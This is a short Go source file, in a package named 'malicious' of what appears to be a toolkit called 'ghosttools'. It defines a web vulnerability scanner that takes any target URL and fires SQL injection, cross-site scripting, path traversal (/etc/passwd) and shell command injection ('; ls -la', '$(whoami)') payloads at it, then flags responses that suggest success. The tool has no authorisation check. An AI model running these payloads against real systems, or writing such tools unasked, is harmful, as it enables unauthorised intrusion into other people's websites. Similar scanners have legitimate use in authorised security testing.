package malicious

import (
    "fmt"
    "net/http"
    "strings"
    "time"

    "ghosttools/internal/ui"
)

func VulnScanner() {
    ui.Cyan("enter target URL:")
    var url string
    fmt.Scanln(&url)
    url = strings.TrimSpace(url)
    if !strings.HasPrefix(url, "http") {
        url = "http://" + url
    }

    payloads := []string{
        "' OR '1'='1",
        "<script>alert(1)</script>",
        "../../../etc/passwd",
        "; ls -la",
        "$(whoami)",
    }

    client := &http.Client{Timeout: 10 * time.Second}
    for _, p := range payloads {
        u := url + "?q=" + p
        resp, err := client.Get(u)
        if err != nil {
            continue
        }
        body := make([]byte, 4096)
        resp.Body.Read(body)
        resp.Body.Close()
        s := string(body)
        if strings.Contains(s, "root:") || strings.Contains(s, "SQL syntax") || strings.Contains(s, "alert(1)") {
            ui.Red("possible vuln with payload: " + p)
        }
    }
    ui.Green("scan complete.")
}